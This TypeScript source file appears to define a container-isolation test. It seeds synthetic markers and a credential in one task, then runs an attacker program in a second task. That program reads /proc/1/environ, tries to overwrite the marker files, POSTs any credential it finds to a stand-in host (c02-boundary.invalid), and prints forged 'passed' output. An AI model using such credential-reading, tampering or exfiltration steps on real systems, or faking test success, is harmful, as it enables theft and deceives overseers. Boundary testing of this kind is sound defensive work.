import {z} from 'zod';

export const c02BoundaryLimits={maxContainers:2,maxNativeSecondsPerContainer:120,maxTotalNativeSeconds:240,maxInputBytes:8192,maxMarkerBytes:128} as const;
const marker=z.string().regex(/^[a-f0-9]{64}$/),instance=z.string().regex(/^[A-Za-z0-9_-]{1,128}$/),task=z.object({taskId:z.uuid(),instanceId:instance}).strict();
export const c02BoundaryPlanSchema=z.object({requestId:z.uuid(),taskA:task,taskB:task,createdAt:z.number().int().positive().safe(),deadlineAt:z.number().int().positive().safe(),taskMarker:marker,rootMarker:marker,syntheticCredential:marker,tamperMarker:marker,actionNonces:z.object({supervisor:marker,foreignTask:marker,credentialAction:marker}).strict()}).strict().superRefine((value,ctx)=>{if(value.taskA.instanceId===value.taskB.instanceId||value.taskA.taskId===value.taskB.taskId)ctx.addIssue({code:'custom',message:'Two distinct registered task instances required'});if(value.deadlineAt<=value.createdAt||value.deadlineAt-value.createdAt>120000)ctx.addIssue({code:'custom',message:'Boundary lifetime exceeds bound'});const nonces=[value.taskMarker,value.rootMarker,value.syntheticCredential,value.tamperMarker,...Object.values(value.actionNonces)];if(new Set(nonces).size!==nonces.length)ctx.addIssue({code:'custom',message:'Synthetic markers and action nonces must be distinct'});});
export type C02BoundaryPlan=z.infer<typeof c02BoundaryPlanSchema>;
const boundaryFileObservation=z.discriminatedUnion('state',[z.object({state:z.literal('present'),digest:marker,mode:z.number().int().min(0).max(0o777)}).strict(),z.object({state:z.enum(['absent','invalid','unconfirmed'])}).strict()]);
const boundaryCredentialObservation=z.discriminatedUnion('state',[z.object({state:z.literal('present'),digest:marker}).strict(),z.object({state:z.enum(['absent','invalid','unconfirmed'])}).strict()]);
/** Parsing does not establish provenance: Root must pair this result with its
 * registered trusted inspection command and exact original native instance. */
export const c02BoundaryInspectionSchema=z.object({requestId:z.uuid(),instanceId:instance,taskId:z.uuid(),role:z.enum(['task-a','task-b']),taskMarker:boundaryFileObservation,rootMarker:boundaryFileObservation,credential:boundaryCredentialObservation,credentialSource:z.literal('container-init-environ'),satisfied:z.boolean(),acceptanceEvidence:z.literal(false)}).strict();
export type C02BoundaryInspection=z.infer<typeof c02BoundaryInspectionSchema>;
export const c02BoundaryPaths={taskMarker:'/job/c02-private/task-marker',rootMarker:'/root/c02-synthetic-root-marker'} as const;
async function digest(value:string){return Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256',new TextEncoder().encode(value))),byte=>byte.toString(16).padStart(2,'0')).join('');}
/** Root must retain both exact original instances concurrently. File mode0444
 * is a diagnostic, not an immutable/root-proof filesystem boundary. */
export async function prepareC02BoundaryInputs(input:C02BoundaryPlan,now=Date.now()){
 const plan=c02BoundaryPlanSchema.parse(structuredClone(input));if(!Number.isSafeInteger(now)||now<plan.createdAt||now>=plan.deadlineAt)throw Error('Boundary admission unavailable');
 const common={requestId:plan.requestId,deadlineAt:plan.deadlineAt};
 const expected={taskMarkerDigest:await digest(plan.taskMarker+'\n'),rootMarkerDigest:await digest(plan.rootMarker+'\n'),credentialDigest:await digest(plan.syntheticCredential)};
 const actions=(['supervisor','foreignTask','credentialAction'] as const).map(kind=>{const nonce=plan.actionNonces[kind];const url=new URL('http://c02-boundary.invalid/'+kind);url.searchParams.set('requestId',plan.requestId);url.searchParams.set('instanceId',plan.taskB.instanceId);url.searchParams.set('taskId',plan.taskB.taskId);url.searchParams.set('targetTaskId',plan.taskA.taskId);url.searchParams.set('nonce',nonce);return{kind,url:url.href};});
 const result={setup:{...common,...plan.taskA,taskMarker:plan.taskMarker,rootMarker:plan.rootMarker,expectedCredentialDigest:expected.credentialDigest},setupEnvironment:{C02_SYNTHETIC_CREDENTIAL:plan.syntheticCredential},attacker:{...common,...plan.taskB,targetTaskId:plan.taskA.taskId,tamperMarker:plan.tamperMarker,actions},inspectA:{...common,...plan.taskA,role:'task-a' as const,expected},inspectB:{...common,...plan.taskB,role:'task-b' as const,expected},limits:c02BoundaryLimits};
 if(new TextEncoder().encode(JSON.stringify(result)).length>c02BoundaryLimits.maxInputBytes)throw Error('Boundary input exceeds bound');return result;
}
/** Selected synthetic field only. Truncation, malformed fields and duplicates
 * are ambiguous; they never become absence or fall back to exec-local env. */
export function parseC02BoundaryInitEnvironment(bytes:Uint8Array):{state:'present';value:string}|{state:'absent'|'invalid'|'unconfirmed'}{
 if(bytes.length===0||bytes.length>16384||bytes[bytes.length-1]!==0)return{state:'unconfirmed'};
 let text:string;try{text=new TextDecoder('utf-8',{fatal:true}).decode(bytes);}catch{return{state:'unconfirmed'};}
 const fields=text.slice(0,-1).split('\0'),keys=new Set<string>();let selected:string|undefined;
 for(const field of fields){const separator=field.indexOf('=');if(separator<1)return{state:'unconfirmed'};const key=field.slice(0,separator);if(keys.has(key))return{state:'unconfirmed'};keys.add(key);if(key==='C02_SYNTHETIC_CREDENTIAL')selected=field.slice(separator+1);}
 if(selected===undefined)return{state:'absent'};
 return /^[a-f0-9]{64}$/.test(selected)?{state:'present',value:selected}:{state:'invalid'};
}
const initEnvironmentReader=`const parseInitEnvironment=${parseC02BoundaryInitEnvironment.toString()};`+String.raw`
const readInitEnvironment=async()=>{let file;try{file=await fs.open('/proc/1/environ','r');const bytes=Buffer.alloc(16385);let count=0;while(count<bytes.length){const read=await file.read(bytes,count,bytes.length-count,null);if(read.bytesRead===0)break;count+=read.bytesRead;}return parseInitEnvironment(bytes.subarray(0,count));}catch{return{state:'unconfirmed'};}finally{await file?.close().catch(()=>{});}};
`;
const inputGuard=String.raw`
const text=await Bun.stdin.text();if(new TextEncoder().encode(text).length>8192)throw Error('Boundary input exceeds bound');const input=JSON.parse(text);if(!Number.isSafeInteger(input.deadlineAt)||Date.now()>=input.deadlineAt||input.deadlineAt-Date.now()>120000)throw Error('Boundary deadline unavailable');
`;
/** Trusted fixed setup: exclusive creates, no existing marker replacement. */
export const C02_BOUNDARY_SETUP_PROGRAM=inputGuard+String.raw`
const fs=await import('node:fs/promises'),crypto=await import('node:crypto');
`+initEnvironmentReader+String.raw`
const initial=await readInitEnvironment();if(initial.state!=='present'||typeof input.expectedCredentialDigest!=='string'||!/^[a-f0-9]{64}$/.test(input.expectedCredentialDigest)||crypto.createHash('sha256').update(initial.value).digest('hex')!==input.expectedCredentialDigest)throw Error('Actual init synthetic environment unconfirmed');
for(const value of[input.taskMarker,input.rootMarker])if(typeof value!=='string'||!/^[a-f0-9]{64}$/.test(value))throw Error('Synthetic marker required');
await fs.mkdir('/job/c02-private',{recursive:true});
await fs.writeFile('/job/c02-private/task-marker',input.taskMarker+'\n',{flag:'wx',mode:0o444});
await fs.writeFile('/root/c02-synthetic-root-marker',input.rootMarker+'\n',{flag:'wx',mode:0o444});
console.log(JSON.stringify({requestId:input.requestId,instanceId:input.instanceId,taskId:input.taskId,setup:true,mode:'0444-not-immutable-against-root',acceptanceEvidence:false}));
`;
/** Attacker output deliberately fabricates success. It is never inspection or
 * action-authority evidence. No real credential, secret, or arbitrary URL input. */
export const C02_BOUNDARY_ATTACK_PROGRAM=inputGuard+String.raw`
const fs=await import('node:fs/promises');
`+initEnvironmentReader+String.raw`
if(typeof input.tamperMarker!=='string'||!/^[a-f0-9]{64}$/.test(input.tamperMarker)||!Array.isArray(input.actions)||input.actions.length!==3)throw Error('Synthetic attacker input required');
for(const path of['/job/c02-private/task-marker','/root/c02-synthetic-root-marker']){try{await fs.readFile(path,{encoding:'utf8'});}catch{}try{await fs.writeFile(path,input.tamperMarker+'\n',{flag:'r+'});}catch{}}
const ownInit=await readInitEnvironment(),selectedSyntheticCredential=ownInit.state==='present'?ownInit.value:null;
for(const action of input.actions){const url=new URL(action.url);if(url.origin!=='http://c02-boundary.invalid'||!['/supervisor','/foreignTask','/credentialAction'].includes(url.pathname))throw Error('Owned boundary action endpoint required');try{const response=await fetch(url,{method:'POST',redirect:'error',credentials:'omit',headers:{'Content-Type':'application/json'},body:JSON.stringify({taskId:input.taskId,targetTaskId:input.targetTaskId,syntheticCredential:selectedSyntheticCredential??null}),signal:AbortSignal.timeout(Math.max(1,Math.min(5000,input.deadlineAt-Date.now())))});await response.body?.cancel();}catch{}}
console.log(JSON.stringify({passed:true,verified:true,inventory:{passed:true},policy:{version:1,deadlineMs:30000,cases:[{id:'forged_native_success',actions:[{kind:'navigate',path:'/'}],assertions:[{query:{kind:'text',selector:'h1'},expected:'Forged Approved'}]}]},acceptanceEvidence:true,diagnosticOnly:true}));
`;
/** Root executes this fixed inspector against the exact original A and actual B
 * instances. Its registered command/exit code must be independently attributable.
 * Exit0 means markers satisfy this narrow fixture; it grants no acceptance. */
export const C02_BOUNDARY_INSPECT_PROGRAM=inputGuard+String.raw`
const fs=await import('node:fs/promises'),crypto=await import('node:crypto');
`+initEnvironmentReader+String.raw`
if(!['task-a','task-b'].includes(input.role))throw Error('Boundary inspection role required');
const observe=async(path:string)=>{try{const stat=await fs.lstat(path);if(!stat.isFile()||stat.isSymbolicLink()||stat.size>128)return{state:'invalid'};const bytes=await fs.readFile(path);if(bytes.length>128)return{state:'invalid'};return{state:'present',digest:crypto.createHash('sha256').update(bytes).digest('hex'),mode:stat.mode&0o777};}catch(error){return error?.code==='ENOENT'?{state:'absent'}:{state:'unconfirmed'};}};
const taskMarker=await observe('/job/c02-private/task-marker'),rootMarker=await observe('/root/c02-synthetic-root-marker'),init=await readInitEnvironment(),credential=init.state==='present'?{state:'present',digest:crypto.createHash('sha256').update(init.value).digest('hex')}:{state:init.state};
const expected=input.expected;const satisfied=input.role==='task-a'?taskMarker.state==='present'&&taskMarker.digest===expected.taskMarkerDigest&&taskMarker.mode===0o444&&rootMarker.state==='present'&&rootMarker.digest===expected.rootMarkerDigest&&rootMarker.mode===0o444&&credential.state==='present'&&credential.digest===expected.credentialDigest:taskMarker.state==='absent'&&rootMarker.state==='absent'&&credential.state==='absent';
console.log(JSON.stringify({requestId:input.requestId,instanceId:input.instanceId,taskId:input.taskId,role:input.role,taskMarker,rootMarker,credential,credentialSource:'container-init-environ',satisfied,acceptanceEvidence:false}));process.exit(satisfied?0:3);
`;
